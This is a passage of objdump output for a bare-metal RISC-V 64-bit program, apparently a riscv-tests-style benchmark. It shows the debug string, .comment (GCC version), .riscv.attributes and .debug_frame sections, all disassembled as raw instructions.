 7be:	006c                	addi	a1,sp,12
 7c0:	6576                	ld	a0,344(sp)
 7c2:	6972                	ld	s2,280(sp)
 7c4:	7966                	ld	s2,120(sp)
 7c6:	6f44                	ld	s1,152(a4)
 7c8:	6275                	lui	tp,0x1d
 7ca:	656c                	ld	a1,200(a0)
 7cc:	6700                	ld	s0,8(a4)
 7ce:	7465                	lui	s0,0xffff9
 7d0:	6e69                	lui	t3,0x1a
 7d2:	0074                	addi	a3,sp,12
 7d4:	6e75                	lui	t3,0x1d
 7d6:	6e676973          	csrrsi	s2,0x6e6,14
 7da:	6465                	lui	s0,0x19
 7dc:	6e5f 6d75 6562      	0x65626d756e5f
 7e2:	0072                	c.slli	zero,0x1c
 7e4:	7570                	ld	a2,232(a0)
 7e6:	6474                	ld	a3,200(s0)
 7e8:	7461                	lui	s0,0xffff8
 7ea:	6100                	ld	s0,0(a0)
 7ec:	6772                	ld	a4,280(sp)
 7ee:	68770063          	beq	a4,t2,e6e <_tbss_end+0xdea>
 7f2:	6369                	lui	t1,0x1a
 7f4:	0068                	addi	a0,sp,12
 7f6:	7261                	lui	tp,0xffff8
 7f8:	73007667          	0x73007667
 7fc:	7270                	ld	a2,224(a2)
 7fe:	6e69                	lui	t3,0x1a
 800:	6674                	ld	a3,200(a2)
 802:	5f00                	lw	s0,56(a4)
 804:	6474                	ld	a3,200(s0)
 806:	7461                	lui	s0,0xffff8
 808:	5f61                	li	t5,-8
 80a:	6562                	ld	a0,24(sp)
 80c:	006e6967          	0x6e6967
 810:	636e                	ld	t1,216(sp)
 812:	7365726f          	jal	tp,57f48 <_tbss_end+0x57ec4>
 816:	5f00                	lw	s0,56(a4)
 818:	755f 6e69 7074      	0x70746e69755f
 81e:	7274                	ld	a3,224(a2)
 820:	745f 6100 746c      	0x746c6100745f
 826:	6c66                	ld	s8,88(sp)
 828:	6761                	lui	a4,0x18
 82a:	7400                	ld	s0,40(s0)
 82c:	7362                	ld	t1,56(sp)
 82e:	69735f73          	csrrwi	t5,0x697,6
 832:	657a                	ld	a0,408(sp)
 834:	7400                	ld	s0,40(s0)
 836:	7268                	ld	a0,224(a2)
 838:	6165                	addi	sp,sp,112
 83a:	5f64                	lw	s1,124(a4)
 83c:	6f70                	ld	a2,216(a4)
 83e:	6e69                	lui	t3,0x1a
 840:	6574                	ld	a3,200(a0)
 842:	0072                	c.slli	zero,0x1c
 844:	6e756f63          	bltu	a0,t2,f42 <_tbss_end+0xebe>
 848:	6574                	ld	a3,200(a0)
 84a:	5f72                	lw	t5,60(sp)
 84c:	616e                	ld	sp,216(sp)
 84e:	656d                	lui	a0,0x1b
 850:	6f770073          	0x6f770073
 854:	6472                	ld	s0,280(sp)
 856:	5f00                	lw	s0,56(a4)
 858:	6274                	ld	a3,192(a2)
 85a:	655f7373          	csrrci	t1,0x655,30
 85e:	646e                	ld	s0,216(sp)
 860:	4700                	lw	s0,8(a4)
 862:	554e                	lw	a0,240(sp)
 864:	4320                	lw	s0,64(a4)
 866:	3731                	addiw	a4,a4,-20
 868:	3920                	fld	fs0,112(a0)
 86a:	322e                	fld	ft4,232(sp)
 86c:	302e                	fld	ft0,232(sp)
 86e:	2d20                	fld	fs0,88(a0)
 870:	636d                	lui	t1,0x1b
 872:	6f6d                	lui	t5,0x1b
 874:	6564                	ld	s1,200(a0)
 876:	3d6c                	fld	fa1,248(a0)
 878:	656d                	lui	a0,0x1b
 87a:	6164                	ld	s1,192(a0)
 87c:	796e                	ld	s2,248(sp)
 87e:	2d20                	fld	fs0,88(a0)
 880:	746d                	lui	s0,0xffffb
 882:	6e75                	lui	t3,0x1d
 884:	3d65                	addiw	s10,s10,-7
 886:	6f72                	ld	t5,280(sp)
 888:	74656b63          	bltu	a0,t1,fde <_tbss_end+0xf5a>
 88c:	2d20                	fld	fs0,88(a0)
 88e:	616d                	addi	sp,sp,240
 890:	6372                	ld	t1,280(sp)
 892:	3d68                	fld	fa0,248(a0)
 894:	7672                	ld	a2,312(sp)
 896:	3436                	fld	fs0,360(sp)
 898:	6d69                	lui	s10,0x1a
 89a:	6661                	lui	a2,0x18
 89c:	6364                	ld	s1,192(a4)
 89e:	2d20                	fld	fs0,88(a0)
 8a0:	616d                	addi	sp,sp,240
 8a2:	6962                	ld	s2,24(sp)
 8a4:	6c3d                	lui	s8,0xf
 8a6:	3670                	fld	fa2,232(a2)
 8a8:	6434                	ld	a3,72(s0)
 8aa:	2d20                	fld	fs0,88(a0)
 8ac:	4f2d2067          	0x4f2d2067
 8b0:	2030                	fld	fa2,64(s0)
 8b2:	662d                	lui	a2,0xb
 8b4:	6f6e                	ld	t5,216(sp)
 8b6:	632d                	lui	t1,0xb
 8b8:	6f6d6d6f          	jal	s10,d6fae <_tbss_end+0xd6f2a>
 8bc:	206e                	fld	ft0,216(sp)
 8be:	662d                	lui	a2,0xb
 8c0:	6f6e                	ld	t5,216(sp)
 8c2:	622d                	lui	tp,0xb
 8c4:	6975                	lui	s2,0x1d
 8c6:	746c                	ld	a1,232(s0)
 8c8:	6e69                	lui	t3,0x1a
 8ca:	702d                	c.lui	zero,0xfffeb
 8cc:	6972                	ld	s2,280(sp)
 8ce:	746e                	ld	s0,248(sp)
 8d0:	0066                	c.slli	zero,0x19
 8d2:	6f74                	ld	a3,216(a4)
 8d4:	6f68                	ld	a0,216(a4)
 8d6:	64007473          	csrrci	s0,0x640,0
 8da:	6769                	lui	a4,0x1a
 8dc:	70730073          	0x70730073
 8e0:	6972                	ld	s2,280(sp)
 8e2:	746e                	ld	s0,248(sp)
 8e4:	5f66                	lw	t5,120(sp)
 8e6:	7570                	ld	a2,232(a0)
 8e8:	6374                	ld	a3,192(a4)
 8ea:	0068                	addi	a0,sp,12
 8ec:	7962                	ld	s2,56(sp)
 8ee:	6574                	ld	a3,200(a0)
 8f0:	7000                	ld	s0,32(s0)
 8f2:	6972                	ld	s2,280(sp)
 8f4:	746e                	ld	s0,248(sp)
 8f6:	6568                	ld	a0,200(a0)
 8f8:	0078                	addi	a4,sp,12
 8fa:	6874                	ld	a3,208(s0)
 8fc:	6572                	ld	a0,280(sp)
 8fe:	6461                	lui	s0,0x18
 900:	736e6573          	csrrsi	a0,0x736,28
 904:	0065                	c.nop	25
 906:	6574                	ld	a3,200(a0)
 908:	70007473          	csrrci	s0,0x700,0
 90c:	7562                	ld	a0,56(sp)
 90e:	0066                	c.slli	zero,0x19
 910:	616d                	addi	sp,sp,240
 912:	5f636967          	0x5f636967
 916:	656d                	lui	a0,0x1b
 918:	006d                	c.nop	27
 91a:	6f74                	ld	a3,216(a4)
 91c:	6f68                	ld	a0,216(a4)
 91e:	655f7473          	csrrci	s0,0x655,30
 922:	6978                	ld	a4,208(a0)
 924:	0074                	addi	a3,sp,12
 926:	7266                	ld	tp,120(sp)
 928:	6f686d6f          	jal	s10,8701e <_tbss_end+0x86f9a>
 92c:	6d007473          	csrrci	s0,0x6d0,0
 930:	6d65                	lui	s10,0x19
 932:	00797063          	bleu	t2,s2,932 <_tbss_end+0x8ae>
 936:	5f5f 7562 6c69      	0x6c6975625f5f
 93c:	6974                	ld	a3,208(a0)
 93e:	5f6e                	lw	t5,248(sp)
 940:	6176                	ld	sp,344(sp)
 942:	6c5f 7369 0074      	0x7473696c5f
 948:	7461                	lui	s0,0xffff8
 94a:	73006c6f          	jal	s8,707a <_tbss_end+0x6ff6>
 94e:	7465                	lui	s0,0xffff9
 950:	74617453          	0x74617453
 954:	6e690073          	0x6e690073
 958:	7469                	lui	s0,0xffffa
 95a:	745f 736c 7600      	0x7600736c745f
 960:	7265                	lui	tp,0xffff9
 962:	6669                	lui	a2,0x1a
 964:	0079                	c.nop	30
 966:	6564                	ld	s1,200(a0)
 968:	76007473          	csrrci	s0,0x760,0
 96c:	7270                	ld	a2,224(a2)
 96e:	6e69                	lui	t3,0x1a
 970:	6674                	ld	a3,200(a2)
 972:	746d                	lui	s0,0xffffb
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	3a434347          	fmsub.d	ft6,ft6,ft4,ft7,rmm
   4:	2820                	fld	fs0,80(s0)
   6:	29554e47          	fmsub.s	ft8,fa0,fs5,ft5,rmm
   a:	3720                	fld	fs0,104(a4)
   c:	322e                	fld	ft4,232(sp)
   e:	302e                	fld	ft0,232(sp)
  10:	4700                	lw	s0,8(a4)
  12:	203a4343          	fmadd.s	ft6,fs4,ft3,ft4,rmm
  16:	4728                	lw	a0,72(a4)
  18:	554e                	lw	a0,240(sp)
  1a:	2029                	0x2029
  1c:	2e39                	addiw	t3,t3,14
  1e:	2e32                	fld	ft8,264(sp)
  20:	0030                	addi	a2,sp,8

Disassembly of section .riscv.attributes:

0000000000000000 <.riscv.attributes>:
   0:	3441                	addiw	s0,s0,-16
   2:	0000                	unimp
   4:	7200                	ld	s0,32(a2)
   6:	7369                	lui	t1,0xffffa
   8:	01007663          	bleu	a6,zero,14 <_tdata_begin+0x14>
   c:	002a                	c.slli	zero,0xa
   e:	0000                	unimp
  10:	1004                	addi	s1,sp,32
  12:	7205                	lui	tp,0xfffe1
  14:	3676                	fld	fa2,376(sp)
  16:	6934                	ld	a3,80(a0)
  18:	7032                	0x7032
  1a:	5f30                	lw	a2,120(a4)
  1c:	326d                	addiw	tp,tp,-5
  1e:	3070                	fld	fa2,224(s0)
  20:	615f 7032 5f30      	0x5f307032615f
  26:	3266                	fld	ft4,120(sp)
  28:	3070                	fld	fa2,224(s0)
  2a:	645f 7032 5f30      	0x5f307032645f
  30:	30703263          	0x30703263
	...

Disassembly of section .debug_frame:

0000000000000000 <.debug_frame>:
   0:	000c                	0xc
   2:	0000                	unimp
   4:	ffff                	0xffff
   6:	ffff                	0xffff
   8:	0001                	nop
   a:	7c01                	lui	s8,0xfffe0
   c:	0d01                	addi	s10,s10,0
   e:	0002                	c.slli	zero,0x0
  10:	0024                	addi	s1,sp,8
  12:	0000                	unimp
  14:	0000                	unimp
  16:	0000                	unimp
  18:	1048                	addi	a0,sp,36
  1a:	8000                	0x8000
  1c:	0000                	unimp
  1e:	0000                	unimp
  20:	00ce                	slli	ra,ra,0x13
  22:	0000                	unimp
  24:	0000                	unimp
  26:	0000                	unimp
  28:	0e42                	slli	t3,t3,0x10
  2a:	4260                	lw	s0,68(a2)
  2c:	0288                	addi	a0,sp,320
  2e:	0c42                	slli	s8,s8,0x10
  30:	0008                	0x8
  32:	c402                	sw	zero,8(sp)
  34:	42c8                	lw	a0,4(a3)
  36:	020d                	addi	tp,tp,3
  38:	0024                	addi	s1,sp,8
  3a:	0000                	unimp
  3c:	0000                	unimp
  3e:	0000                	unimp
  40:	1116                	slli	sp,sp,0x25
  42:	8000                	0x8000
  44:	0000                	unimp
  46:	0000                	unimp
  48:	00ec                	addi	a1,sp,76
  4a:	0000                	unimp
  4c:	0000                	unimp
  4e:	0000                	unimp
  50:	0e42                	slli	t3,t3,0x10
  52:	4240                	lw	s0,4(a2)
  54:	0288                	addi	a0,sp,320
  56:	0c42                	slli	s8,s8,0x10
  58:	0008                	0x8
  5a:	e202                	sd	zero,256(sp)
  5c:	42c8                	lw	a0,4(a3)
  5e:	020d                	addi	tp,tp,3
  60:	0024                	addi	s1,sp,8
  62:	0000                	unimp
  64:	0000                	unimp
  66:	0000                	unimp
  68:	1202                	slli	tp,tp,0x20
  6a:	8000                	0x8000
  6c:	0000                	unimp
  6e:	0000                	unimp
  70:	00e2                	slli	ra,ra,0x18
  72:	0000                	unimp
  74:	0000                	unimp
  76:	0000                	unimp
  78:	0e42                	slli	t3,t3,0x10
  7a:	4230                	lw	a2,64(a2)
  7c:	0288                	addi	a0,sp,320
  7e:	0c42                	slli	s8,s8,0x10
  80:	0008                	0x8
  82:	d802                	sw	zero,48(sp)
  84:	42c8                	lw	a0,4(a3)
  86:	020d                	addi	tp,tp,3
  88:	002c                	addi	a1,sp,8
  8a:	0000                	unimp
  8c:	0000                	unimp
  8e:	0000                	unimp
  90:	12e4                	addi	s1,sp,364
  92:	8000                	0x8000
  94:	0000                	unimp
  96:	0000                	unimp
  98:	0296                	slli	t0,t0,0x5
  9a:	0000                	unimp
  9c:	0000                	unimp
  9e:	0000                	unimp
  a0:	0e42                	slli	t3,t3,0x10
  a2:	0190                	addi	a2,sp,192
  a4:	8144                	0x8144
  a6:	8802                	jr	a6
  a8:	4204                	lw	s1,0(a2)
  aa:	080c                	addi	a1,sp,16
  ac:	0300                	addi	s0,sp,384
  ae:	0288                	addi	a0,sp,320
  b0:	42c1                	li	t0,16
  b2:	42c8                	lw	a0,4(a3)
  b4:	020d                	addi	tp,tp,3
  b6:	0000                	unimp
  b8:	000c                	0xc
  ba:	0000                	unimp
  bc:	ffff                	0xffff
  be:	ffff                	0xffff
  c0:	0001                	nop
  c2:	7c01                	lui	s8,0xfffe0
  c4:	0d01                	addi	s10,s10,0
  c6:	0002                	c.slli	zero,0x0
  c8:	002c                	addi	a1,sp,8
  ca:	0000                	unimp
  cc:	00b8                	addi	a4,sp,72
  ce:	0000                	unimp
  d0:	15a8                	addi	a0,sp,744
  d2:	8000                	0x8000
  d4:	0000                	unimp
  d6:	0000                	unimp
  d8:	001c                	0x1c
  da:	0000                	unimp
  dc:	0000                	unimp
  de:	0000                	unimp
  e0:	0e42                	slli	t3,t3,0x10
  e2:	4230                	lw	a2,64(a2)
  e4:	0288                	addi	a0,sp,320
  e6:	0c42                	slli	s8,s8,0x10
  e8:	0008                	0x8
  ea:	c852                	sw	s4,16(sp)
  ec:	020c                	addi	a1,sp,256
  ee:	4230                	lw	a2,64(a2)
  f0:	000e                	c.slli	zero,0x3
  f2:	0000                	unimp
  f4:	0000                	unimp
  f6:	0000                	unimp
  f8:	002c                	addi	a1,sp,8
  fa:	0000                	unimp
  fc:	00b8                	addi	a4,sp,72
  fe:	0000                	unimp
 100:	15c4                	addi	s1,sp,740
 102:	8000                	0x8000
 104:	0000                	unimp
 106:	0000                	unimp
 108:	001c                	0x1c
 10a:	0000                	unimp
 10c:	0000                	unimp
 10e:	0000                	unimp
 110:	0e42                	slli	t3,t3,0x10
 112:	4230                	lw	a2,64(a2)
 114:	0288                	addi	a0,sp,320
 116:	0c42                	slli	s8,s8,0x10
 118:	0008                	0x8
 11a:	c852                	sw	s4,16(sp)
 11c:	020c                	addi	a1,sp,256
 11e:	4230                	lw	a2,64(a2)
 120:	000e                	c.slli	zero,0x3
 122:	0000                	unimp
 124:	0000                	unimp
 126:	0000                	unimp
 128:	002c                	addi	a1,sp,8
 12a:	0000                	unimp
 12c:	00b8                	addi	a4,sp,72
 12e:	0000                	unimp
 130:	15e0                	addi	s0,sp,748
 132:	8000                	0x8000
 134:	0000                	unimp
 136:	0000                	unimp
 138:	010a                	slli	sp,sp,0x2
 13a:	0000                	unimp
 13c:	0000                	unimp
 13e:	0000                	unimp
 140:	0e42                	slli	t3,t3,0x10
 142:	4250                	lw	a2,4(a2)
 144:	0288                	addi	a0,sp,320
 146:	0c42                	slli	s8,s8,0x10
 148:	0008                	0x8
 14a:	c8010003          	lb	zero,-896(sp)
 14e:	020c                	addi	a1,sp,256
 150:	4250                	lw	a2,4(a2)
 152:	000e                	c.slli	zero,0x3
 154:	0000                	unimp
 156:	0000                	unimp
 158:	002c                	addi	a1,sp,8
 15a:	0000                	unimp
 15c:	00b8                	addi	a4,sp,72
 15e:	0000                	unimp
 160:	16ea                	slli	a3,a3,0x3a
 162:	8000                	0x8000
 164:	0000                	unimp
 166:	0000                	unimp
 168:	0122                	slli	sp,sp,0x8
 16a:	0000                	unimp
 16c:	0000                	unimp
 16e:	0000                	unimp
 170:	0e42                	slli	t3,t3,0x10
 172:	4260                	lw	s0,68(a2)
 174:	0288                	addi	a0,sp,320
 176:	0c42                	slli	s8,s8,0x10
 178:	0008                	0x8
 17a:	c8011803          	lh	a6,-896(sp)
 17e:	020c                	addi	a1,sp,256
 180:	4260                	lw	s0,68(a2)
 182:	000e                	c.slli	zero,0x3
 184:	0000                	unimp
 186:	0000                	unimp
 188:	002c                	addi	a1,sp,8
 18a:	0000                	unimp
 18c:	00b8                	addi	a4,sp,72
 18e:	0000                	unimp
 190:	180c                	addi	a1,sp,48
 192:	8000                	0x8000
 194:	0000                	unimp
 196:	0000                	unimp
 198:	008a                	slli	ra,ra,0x2
 19a:	0000                	unimp
 19c:	0000                	unimp
 19e:	0000                	unimp
 1a0:	0e42                	slli	t3,t3,0x10
 1a2:	4220                	lw	s0,64(a2)
 1a4:	0288                	addi	a0,sp,320
 1a6:	0c42                	slli	s8,s8,0x10
 1a8:	0008                	0x8
 1aa:	8002                	0x8002
 1ac:	0cc8                	addi	a0,sp,596
 1ae:	2002                	fld	ft0,0(sp)
 1b0:	0e42                	slli	t3,t3,0x10
 1b2:	0000                	unimp
 1b4:	0000                	unimp
 1b6:	0000                	unimp
 1b8:	002c                	addi	a1,sp,8
 1ba:	0000                	unimp
 1bc:	00b8                	addi	a4,sp,72
 1be:	0000                	unimp
 1c0:	1896                	slli	a7,a7,0x25
 1c2:	8000                	0x8000
 1c4:	0000                	unimp
 1c6:	0000                	unimp
 1c8:	0036                	c.slli	zero,0xd
 1ca:	0000                	unimp
 1cc:	0000                	unimp
 1ce:	0000                	unimp
 1d0:	0e42                	slli	t3,t3,0x10
 1d2:	4230                	lw	a2,64(a2)
 1d4:	0288                	addi	a0,sp,320
 1d6:	0c42                	slli	s8,s8,0x10
 1d8:	0008                	0x8
 1da:	c86c                	sw	a1,84(s0)
 1dc:	020c                	addi	a1,sp,256
 1de:	4230                	lw	a2,64(a2)
 1e0:	000e                	c.slli	zero,0x3
 1e2:	0000                	unimp
 1e4:	0000                	unimp
 1e6:	0000                	unimp
 1e8:	002c                	addi	a1,sp,8
 1ea:	0000                	unimp
 1ec:	00b8                	addi	a4,sp,72
 1ee:	0000                	unimp
 1f0:	18cc                	addi	a1,sp,116
 1f2:	8000                	0x8000
 1f4:	0000                	unimp
 1f6:	0000                	unimp
 1f8:	007e                	c.slli	zero,0x1f
 1fa:	0000                	unimp
 1fc:	0000                	unimp
 1fe:	0000                	unimp
 200:	0e42                	slli	t3,t3,0x10
 202:	01b0                	addi	a2,sp,200
 204:	8842                	mv	a6,a6
 206:	4202                	lw	tp,0(sp)
 208:	080c                	addi	a1,sp,16
 20a:	0200                	addi	s0,sp,256
 20c:	c874                	sw	a3,84(s0)
 20e:	020c                	addi	a1,sp,256
 210:	01b0                	addi	a2,sp,200
 212:	0e42                	slli	t3,t3,0x10
 214:	0000                	unimp
 216:	0000                	unimp
 218:	002c                	addi	a1,sp,8
 21a:	0000                	unimp
 21c:	00b8                	addi	a4,sp,72
 21e:	0000                	unimp
 220:	194a                	slli	s2,s2,0x32
 222:	8000                	0x8000
 224:	0000                	unimp
 226:	0000                	unimp
 228:	0110                	addi	a2,sp,128
 22a:	0000                	unimp
 22c:	0000                	unimp
 22e:	0000                	unimp
 230:	0e42                	slli	t3,t3,0x10
 232:	4250                	lw	a2,4(a2)
 234:	0288                	addi	a0,sp,320
 236:	0c42                	slli	s8,s8,0x10
 238:	0008                	0x8
 23a:	c8010603          	lb	a2,-896(sp)
 23e:	020c                	addi	a1,sp,256
 240:	4250                	lw	a2,4(a2)
 242:	000e                	c.slli	zero,0x3
 244:	0000                	unimp
 246:	0000                	unimp
 248:	0024                	addi	s1,sp,8
 24a:	0000                	unimp
 24c:	00b8                	addi	a4,sp,72
 24e:	0000                	unimp
 250:	1a5a                	slli	s4,s4,0x36
 252:	8000                	0x8000
 254:	0000                	unimp
 256:	0000                	unimp
 258:	0020                	addi	s0,sp,8
 25a:	0000                	unimp
 25c:	0000                	unimp
 25e:	0000                	unimp
 260:	0e42                	slli	t3,t3,0x10
 262:	4220                	lw	s0,64(a2)
 264:	0288                	addi	a0,sp,320
 266:	0c42                	slli	s8,s8,0x10
 268:	0008                	0x8
 26a:	0000                	unimp
 26c:	0000                	unimp
 26e:	0000                	unimp
 270:	0024                	addi	s1,sp,8
 272:	0000                	unimp
 274:	00b8                	addi	a4,sp,72
 276:	0000                	unimp
 278:	1a7a                	slli	s4,s4,0x3e
 27a:	8000                	0x8000
 27c:	0000                	unimp
 27e:	0000                	unimp
 280:	001c                	0x1c
 282:	0000                	unimp
 284:	0000                	unimp
 286:	0000                	unimp
 288:	0e42                	slli	t3,t3,0x10
 28a:	4430                	lw	a2,72(s0)
 28c:	0281                	addi	t0,t0,0
 28e:	0488                	addi	a0,sp,576
 290:	0c42                	slli	s8,s8,0x10
 292:	0008                	0x8
 294:	0000                	unimp
 296:	0000                	unimp
 298:	0024                	addi	s1,sp,8
 29a:	0000                	unimp
 29c:	00b8                	addi	a4,sp,72
 29e:	0000                	unimp
 2a0:	1a96                	slli	s5,s5,0x25
 2a2:	8000                	0x8000
 2a4:	0000                	unimp
 2a6:	0000                	unimp
 2a8:	0018                	0x18
 2aa:	0000                	unimp
 2ac:	0000                	unimp
 2ae:	0000                	unimp
 2b0:	0e42                	slli	t3,t3,0x10
 2b2:	4420                	lw	s0,72(s0)
 2b4:	0281                	addi	t0,t0,0
 2b6:	0488                	addi	a0,sp,576
 2b8:	0c42                	slli	s8,s8,0x10
 2ba:	0008                	0x8
 2bc:	0000                	unimp
 2be:	0000                	unimp
 2c0:	0024                	addi	s1,sp,8
 2c2:	0000                	unimp
 2c4:	00b8                	addi	a4,sp,72
 2c6:	0000                	unimp
 2c8:	1aae                	slli	s5,s5,0x2b
 2ca:	8000                	0x8000
 2cc:	0000                	unimp
 2ce:	0000                	unimp
 2d0:	0010                	0x10
 2d2:	0000                	unimp
 2d4:	0000                	unimp
 2d6:	0000                	unimp
 2d8:	0e42                	slli	t3,t3,0x10
 2da:	4410                	lw	a2,8(s0)
 2dc:	0281                	addi	t0,t0,0
 2de:	0488                	addi	a0,sp,576
 2e0:	0c42                	slli	s8,s8,0x10
 2e2:	0008                	0x8
 2e4:	0000                	unimp
 2e6:	0000                	unimp
 2e8:	0034                	addi	a3,sp,8
 2ea:	0000                	unimp
 2ec:	00b8                	addi	a4,sp,72
 2ee:	0000                	unimp
 2f0:	1abe                	slli	s5,s5,0x2f
 2f2:	8000                	0x8000
 2f4:	0000                	unimp
 2f6:	0000                	unimp
 2f8:	0036                	c.slli	zero,0xd
 2fa:	0000                	unimp
 2fc:	0000                	unimp
 2fe:	0000                	unimp
 300:	0e42                	slli	t3,t3,0x10
 302:	4630                	lw	a2,72(a2)
 304:	0281                	addi	t0,t0,0
 306:	0488                	addi	a0,sp,576
 308:	0689                	addi	a3,a3,2
 30a:	0c42                	slli	s8,s8,0x10
 30c:	0008                	0x8
 30e:	c164                	sw	s1,68(a0)
 310:	c842                	sw	a6,16(sp)
 312:	020c                	addi	a1,sp,256
 314:	4230                	lw	a2,64(a2)
 316:	42c9                	li	t0,18
 318:	000e                	c.slli	zero,0x3
 31a:	0000                	unimp
 31c:	0000                	unimp
 31e:	0000                	unimp
 320:	002c                	addi	a1,sp,8
 322:	0000                	unimp
 324:	00b8                	addi	a4,sp,72
 326:	0000                	unimp
 328:	1af4                	addi	a3,sp,380
 32a:	8000                	0x8000
 32c:	0000                	unimp
 32e:	0000                	unimp
 330:	0026                	c.slli	zero,0x9
 332:	0000                	unimp
 334:	0000                	unimp
 336:	0000                	unimp
 338:	0e42                	slli	t3,t3,0x10
 33a:	4220                	lw	s0,64(a2)
 33c:	0288                	addi	a0,sp,320
 33e:	0c42                	slli	s8,s8,0x10
 340:	0008                	0x8
 342:	c85c                	sw	a5,20(s0)
 344:	020c                	addi	a1,sp,256
 346:	4220                	lw	s0,64(a2)
 348:	000e                	c.slli	zero,0x3
 34a:	0000                	unimp
 34c:	0000                	unimp
 34e:	0000                	unimp
 350:	002c                	addi	a1,sp,8
 352:	0000                	unimp
 354:	00b8                	addi	a4,sp,72
 356:	0000                	unimp
 358:	1b1a                	slli	s6,s6,0x26
 35a:	8000                	0x8000
 35c:	0000                	unimp
 35e:	0000                	unimp
 360:	002a                	c.slli	zero,0xa
 362:	0000                	unimp
 364:	0000                	unimp
 366:	0000                	unimp
 368:	0e42                	slli	t3,t3,0x10
 36a:	4420                	lw	s0,72(s0)
 36c:	0281                	addi	t0,t0,0
 36e:	0488                	addi	a0,sp,576
 370:	0c42                	slli	s8,s8,0x10
 372:	0008                	0x8
 374:	c15c                	sw	a5,4(a0)
 376:	c842                	sw	a6,16(sp)
 378:	020c                	addi	a1,sp,256
 37a:	4220                	lw	s0,64(a2)
 37c:	000e                	c.slli	zero,0x3
 37e:	0000                	unimp
 380:	002c                	addi	a1,sp,8
 382:	0000                	unimp
 384:	00b8                	addi	a4,sp,72
 386:	0000                	unimp
 388:	1b44                	addi	s1,sp,436
 38a:	8000                	0x8000
 38c:	0000                	unimp
 38e:	0000                	unimp
 390:	005a                	c.slli	zero,0x16
 392:	0000                	unimp
 394:	0000                	unimp
 396:	0000                	unimp
 398:	0e42                	slli	t3,t3,0x10
 39a:	4420                	lw	s0,72(s0)
 39c:	0281                	addi	t0,t0,0
 39e:	0488                	addi	a0,sp,576
 3a0:	0c42                	slli	s8,s8,0x10
 3a2:	0008                	0x8
 3a4:	4c02                	lw	s8,0(sp)
 3a6:	42c1                	li	t0,16
 3a8:	0cc8                	addi	a0,sp,596
 3aa:	2002                	fld	ft0,0(sp)
 3ac:	0e42                	slli	t3,t3,0x10
 3ae:	0000                	unimp
 3b0:	0024                	addi	s1,sp,8
 3b2:	0000                	unimp
 3b4:	00b8                	addi	a4,sp,72
 3b6:	0000                	unimp
 3b8:	1b9e                	slli	s7,s7,0x27
 3ba:	8000                	0x8000
 3bc:	0000                	unimp
 3be:	0000                	unimp
 3c0:	00e6                	slli	ra,ra,0x19
 3c2:	0000                	unimp
 3c4:	0000                	unimp
 3c6:	0000                	unimp
 3c8:	0e42                	slli	t3,t3,0x10
 3ca:	01b0                	addi	a2,sp,200
 3cc:	8146                	mv	sp,a7
 3ce:	8802                	jr	a6
 3d0:	8904                	0x8904
 3d2:	4206                	lw	tp,64(sp)
 3d4:	080c                	addi	a1,sp,16
 3d6:	0000                	unimp
 3d8:	002c                	addi	a1,sp,8
 3da:	0000                	unimp
 3dc:	00b8                	addi	a4,sp,72
 3de:	0000                	unimp
 3e0:	1c84                	addi	s1,sp,624
 3e2:	8000                	0x8000
 3e4:	0000                	unimp
 3e6:	0000                	unimp
 3e8:	0072                	c.slli	zero,0x1c
 3ea:	0000                	unimp
 3ec:	0000                	unimp
 3ee:	0000                	unimp
 3f0:	0e42                	slli	t3,t3,0x10
 3f2:	4420                	lw	s0,72(s0)
 3f4:	0281                	addi	t0,t0,0
 3f6:	0488                	addi	a0,sp,576
 3f8:	0c42                	slli	s8,s8,0x10
 3fa:	0008                	0x8
 3fc:	6402                	ld	s0,0(sp)
 3fe:	42c1                	li	t0,16
 400:	0cc8                	addi	a0,sp,596
 402:	2002                	fld	ft0,0(sp)
 404:	0e42                	slli	t3,t3,0x10
 406:	0000                	unimp
 408:	002c                	addi	a1,sp,8
 40a:	0000                	unimp
 40c:	00b8                	addi	a4,sp,72
 40e:	0000                	unimp
 410:	1cf6                	slli	s9,s9,0x3d
 412:	8000                	0x8000
 414:	0000                	unimp
 416:	0000                	unimp
 418:	008e                	slli	ra,ra,0x3
 41a:	0000                	unimp
 41c:	0000                	unimp
 41e:	0000                	unimp
 420:	0e42                	slli	t3,t3,0x10
 422:	4440                	lw	s0,12(s0)
 424:	0281                	addi	t0,t0,0
 426:	0488                	addi	a0,sp,576
 428:	0c42                	slli	s8,s8,0x10
 42a:	0008                	0x8
 42c:	8002                	0x8002
 42e:	42c1                	li	t0,16
 430:	0cc8                	addi	a0,sp,596
 432:	4002                	0x4002
 434:	0e42                	slli	t3,t3,0x10
 436:	0000                	unimp
 438:	0034                	addi	a3,sp,8
 43a:	0000                	unimp
 43c:	00b8                	addi	a4,sp,72
 43e:	0000                	unimp
 440:	1d84                	addi	s1,sp,752
 442:	8000                	0x8000
 444:	0000                	unimp
 446:	0000                	unimp
 448:	0102                	slli	sp,sp,0x0
 44a:	0000                	unimp
 44c:	0000                	unimp
 44e:	0000                	unimp
 450:	0e42                	slli	t3,t3,0x10
 452:	02d0                	addi	a2,sp,324
 454:	8144                	0x8144
 456:	8802                	jr	a6
 458:	4204                	lw	s1,0(a2)
 45a:	080c                	addi	a1,sp,16
 45c:	0200                	addi	s0,sp,256
 45e:	c1f4                	sw	a3,68(a1)
 460:	c842                	sw	a6,16(sp)
 462:	020c                	addi	a1,sp,256
 464:	02d0                	addi	a2,sp,324
 466:	0e42                	slli	t3,t3,0x10
	...
 470:	002c                	addi	a1,sp,8
 472:	0000                	unimp
 474:	00b8                	addi	a4,sp,72
 476:	0000                	unimp
 478:	1e86                	slli	t4,t4,0x21
 47a:	8000                	0x8000
 47c:	0000                	unimp
 47e:	0000                	unimp
 480:	006c                	addi	a1,sp,12
 482:	0000                	unimp
 484:	0000                	unimp
 486:	0000                	unimp
 488:	0e42                	slli	t3,t3,0x10
 48a:	4220                	lw	s0,64(a2)
 48c:	0288                	addi	a0,sp,320
 48e:	0c42                	slli	s8,s8,0x10
 490:	0008                	0x8
 492:	6202                	ld	tp,0(sp)
 494:	0cc8                	addi	a0,sp,596
 496:	2002                	fld	ft0,0(sp)
 498:	0e42                	slli	t3,t3,0x10
 49a:	0000                	unimp
 49c:	0000                	unimp
 49e:	0000                	unimp
 4a0:	002c                	addi	a1,sp,8
 4a2:	0000                	unimp
 4a4:	00b8                	addi	a4,sp,72
 4a6:	0000                	unimp
 4a8:	1ef2                	slli	t4,t4,0x3c
 4aa:	8000                	0x8000
 4ac:	0000                	unimp
 4ae:	0000                	unimp
 4b0:	0068                	addi	a0,sp,12
 4b2:	0000                	unimp
 4b4:	0000                	unimp
 4b6:	0000                	unimp
